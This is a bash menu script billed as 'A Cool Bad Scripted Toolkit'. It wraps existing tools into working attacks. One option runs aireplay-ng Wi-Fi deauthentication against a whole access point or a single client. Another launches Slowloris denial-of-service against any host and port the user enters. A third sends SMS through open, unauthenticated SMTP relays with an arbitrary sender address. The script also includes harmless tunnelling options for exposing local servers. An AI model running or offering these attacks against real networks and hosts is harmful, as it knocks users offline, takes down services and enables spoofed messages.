#! /usr/bin/bash
# Requirements: curl msmtp aircrack-ng slowloris python3 openssh-client python2
# Special Requirements: openport (wget https://openport.io/download/debian64/latest.deb)

printf "%s\n" "A Cool Bad Scripted Toolkit" " ";
printf "%s\n" "1) Free SMS sender";
printf "%s\n" "2) Wi-Fi Deauther";
printf "%s\n" "3) DoS Attacks";
printf "%s\n" "4) Host Web Server Without Opening Router Ports";
printf "%s\n" " " "Choice:";
read initialmenuu

if [ $initialmenuu == 1 ]; then
	echo +--------------+
	printf "%s\n" "Free SMS sender";
	echo +--------------+
	echo .
	printf "%s\n" "Select mmethod:";
	printf "%s\n" "1) email-to-SMS gateway";
	printf "%s\n" "2) Textbelt *once a day";
	echo .
	printf "%s\n" "Enter number:";
	read a
	if [ $a == 2 ]; then
		printf "%s\n" "Enter phone number:";
		read b
		printf "%s\n" "Enter message:";
		read c
		curl -X POST https://textbelt.com/text --data-urlencode phone=$b --data-urlencode message="$c" -d key=textbelt
		printf "%s\n" "Press any key";
		read -n1
	fi
	if [ $a == 1 ]; then
		printf "%s\n" "email-to-SMS gateways:";
		echo .
		printf "%s\n" "TIM:		0number@timnet.com";
		printf "%s\n" "Vodafone:	3**number@sms.vodafone.it";
		printf "%s\n" "Sprint PCS:	number@messaging.sprintpcs.com";
		printf "%s\n" "T-Mobile:	number@tmomail.net";
		printf "%s\n" "Virgin:		number@vmobl.com";
		printf "%s\n" "Wind:		number@txt.windmobile.it";
		echo .
		printf "%s\n" "WARNING: only SMTP servers without authentication are accepted!!";
		echo .
		printf "%s\n" "Enter the recipient (number@mail):";
		read d
		printf "%s\n" "Enter the SMTP server without port:";
		read e
		printf "%s\n" "Enter the server port";
		read f
		printf "%s\n" "TLS [on/off]:";
		read g
		printf "%s\n" "Enter (mail) sender:";
		read h
		printf "%s\n" "Enter the message, do not use double quote!!";
		read i
		printf "%s\n" $i | msmtp --host=$e --port=$f --auth=off --tls=$g --from=$h $d
		echo .
		printf "%s\n" "Press any key";
		read -n1
	fi
fi

if [ $initialmenuu == 2 ]; then
	printf "%s\n" "Mass or Single? ;)" " ";
	printf "%s\n" "1) Mass deauth (all users)";
	printf "%s\n" "2) Single target deauth" " ";
	printf "%s\n" "Remember to put in monitor mode your adapter with airmon-ng";
	printf "%s\n" " " "Choice:";
	read wifideauthmainmenu
	if [ $wifideauthmainmenu == 1 ]; then
		printf "%s\n" "Access point MAC: ";
		read massapmac
		printf "%s\n" "Interface: ";
		read massinterface
		aireplay-ng -0 0 -a $massapmac $massinterface
		printf "%s\n" "Press any key";
		read -n1
	fi
	if [ $wifideauthmainmenu == 2 ]; then
		printf "%s\n" "Access point MAC: ";
		read singleapmac
		printf "%s\n" "Interface: ";
		read singleinterface
		printf "%s\n" "Client's MAC: ";
		read singleclientmac
		aireplay-ng -0 0 -a $singleapmac -c $singleclientmac $singleinterface
		printf "%s\n" "Press any key";
		read -n1
	fi
fi

if [ $initialmenuu == 3 ]; then
	printf "%s\n" "Select Method:";
	printf "%s\n" "1) Slow Loris";
	printf "%s\n" "2) DNS amplified (yet to implement)";
	printf "%s\n" "3) NTP amplified (yet to implement)";
	printf "%s\n" " " "Choice:";
	read dosattackmenu
	if [ $dosattackmenu == 1 ]; then
		printf "%s\n" "Host:";
		read slowlorishost
		printf "%s\n" "Port:";
		read slowlorisport
		printf "%s\n" "Sockets:";
		read slowlorissocketn
		printf "%s\n" "HTTPS? [y/n]";
		read slowlorishttps
		if [ $slowlorishttps == n ]; then
			slowloris -p $slowlorisport -s $slowlorissocketn $slowlorishost
		fi
		if [ $slowlorishttps == y ]; then
		slowloris -p $slowlorisport -s $slowlorissocketn --https $slowlorishost
		fi
	fi
	# dns amplified
	# ntp amplified
fi

if [ $initialmenuu == 4 ]; then
	printf "%s\n" "Select Method:";
	printf "%s\n" "1) SSH Tunnel (Default: serveo.net)";
	printf "%s\n" "2) ngrok";
	printf "%s\n" "3) pagekite";
	printf "%s\n" "4) openport (only 64bit)";
	printf "%s\n" "5) python3.8+ (only ipv6)";
	printf "%s\n" " " "Choice:";
	read openaportmnu
	if [ $openaportmnu == 1 ]; then
		printf "%s\n" "Target/Local port:";
		read serveolport
		printf "%s\n" "Remote port: (80?)";
		read serveorport
		printf "%s\n" "Server: (serveo.net?)";
		read serveorserver
		printf "%s\n" "Target Server: (localhost?)";
		read serveolserver
		ssh -R "$serveorport":"$serveolserver":"$serveolport" $serveorserver
		printf "%s\n" "Press any key";
		read -n1
	fi
	if [ $openaportmnu == 2 ]; then
		ngrokfile=./ngrok
		if [ ! -f "$ngrokfile" ]; then
			printf "%s\n" "ngrok not installed, quitting...";
			read -n1
			exit
		fi
		printf "%s\n" "Local port:";
		read ngroklport
		./ngrok http $ngroklport
	fi
	if [ $openaportmnu == 3 ]; then
		pagekitefile=./pagekite.py
		if [ ! -f "$pagekitefile" ]; then
			printf "%s\n" "pagekite not installed. Install? [y/n]";
			read instpagekite
			if [ $instpagekite == y ]; then
				curl -O https://pagekite.net/pk/pagekite.py
			fi
		fi
		printf "%s\n" "Local port:";
		read pagekitelport
		printf "%s\n" "Domain: (format: sitename.pagekite.me)";
		read pagekitedomain
		python2 pagekite.py $pagekitelport "$pagekitedomain"
	fi
	if [ $openaportmnu == 4 ]; then
		printf "%s\n" "Local Port:";
		read openplpport
		openport $openplpport
	fi
	if [ $openaportmnu == 5 ]; then
		printf "Port:";
		read openpyport
		printf "Directory (absolute path):"
		read dirchpy
		cd $dirchpy
		python3 -m http.server -b :: $openpyport
	fi
fi
